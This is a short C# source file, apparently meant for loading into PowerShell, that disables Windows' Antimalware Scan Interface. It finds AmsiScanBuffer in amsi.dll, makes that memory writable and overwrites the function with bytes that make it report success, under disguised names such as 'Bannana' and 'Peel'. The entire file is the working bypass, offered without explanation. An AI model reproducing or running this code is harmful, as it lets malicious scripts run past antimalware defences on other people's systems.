using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Bannana
{
    public static void Peel()
    {
        var modules = Process.GetCurrentProcess().Modules;
        var hAmsi = IntPtr.Zero;

        foreach (ProcessModule module in modules)
        {
            if (module.ModuleName == "amsi.dll")
            {
                hAmsi = module.BaseAddress;
                break;
            }
        }

        IntPtr asb = GetProcAddress(hAmsi, "AmsiScanBuffer");

        if (IntPtr.Size == 4) // 32 bit PS process
        {
            var garbage = new byte[] { 0x31, 0xC0, 0xC2, 0x18, 0x00 }; // xor eax, eax; ret 0x18
            Eat(asb, garbage);
        }
        else if (IntPtr.Size == 8) // 64 bit PS process
        {
            var garbage = new byte[] { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
            Eat(asb, garbage);
        }
    }

    public static void Eat(IntPtr asb, byte[] garbage)
    {
        // Set region to RWX
        VirtualProtect(asb, (UIntPtr)3, 0x40, out uint oldProtect);

        // Copy patch
        Marshal.Copy(garbage, 0, asb, garbage.Length);

        // Retore region to RX
        VirtualProtect(asb, (UIntPtr)3, oldProtect, out uint _);
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
}
